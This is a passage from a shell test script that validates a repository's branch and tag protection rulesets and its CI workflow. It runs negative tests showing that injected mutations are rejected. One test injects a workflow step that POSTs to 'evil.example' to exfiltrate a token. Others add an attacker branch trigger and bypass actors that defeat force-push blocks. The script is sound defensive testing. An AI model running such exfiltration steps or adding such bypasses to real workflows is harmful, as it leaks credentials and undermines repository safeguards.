  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'machinery-stable not covered' machinery-stable-update.json '.conditions.ref_name.include = ["refs/tags/not-stable"]'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'other tag complement missing' other-tags-protected.json '.conditions.ref_name.exclude = []'
  expect_absent_rejected "${suite_dir}" "${rendered_dir}" 'force-push block absent' machinery-stable-forward-only.json
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'A33 force-push bypass' machinery-stable-forward-only.json '.bypass_actors += [{actor_id: 1003, actor_type: "Integration", bypass_mode: "always"}]'
  expect_rendered_rejected "${suite_dir}" "${rendered_dir}" 'A33 catch-all bypass' other-tags-protected.json '.bypass_actors += [{actor_id: 1003, actor_type: "Integration", bypass_mode: "always"}]'

  expect_workflow_source_rejected "${suite_dir}" "${source_dir}" 'extra trigger branch' '.on.push.branches += ["attacker-branch"]'
  expect_workflow_source_rejected "${suite_dir}" "${source_dir}" 'widened trigger path' '.on.push.paths += ["registry/**"]'
  expect_workflow_source_rejected "${suite_dir}" "${source_dir}" 'extra token-exfiltration step' '.jobs["move-forward"].steps += [{"name": "Exfiltrate A33 token", "shell": "bash", "run": "curl -fsS -X POST https://evil.example/exfiltrate"}]'

  [ "${negative_cases_executed}" -gt 18 ] || fail "negative suite did not expand beyond 18 cases (found ${negative_cases_executed})"
  echo "  ${negative_cases_executed} controlled guard mutations rejected ✓"
}

if [ "${1:-}" = '--validate-rendered' ]; then
  [ "$#" -eq 3 ] || fail "usage: $0 --validate-rendered PAYLOAD_DIR CODEOWNERS"
  validate_rendered_set "$2" "$3"
  exit 0
fi
[ "$#" -eq 0 ] || fail "unknown arguments: $*"

suite_dir="$(mktemp -d)"
trap 'rm -rf -- "${suite_dir}"' EXIT
rendered_dir="${suite_dir}/rendered"

validate_raw_templates
render_templates "${rendered_dir}"
validate_rendered_set "${rendered_dir}" "${codeowners}"
validate_source_surface

if [ "${REGISTRY_GUARD_NEGATIVE_TESTS:-1}" = '1' ]; then
  run_negative_suite "${suite_dir}" "${rendered_dir}"
fi

echo '✅ registry guard policy validation passed (branch + four tag rulesets + App/workflow/sandbox controls)'
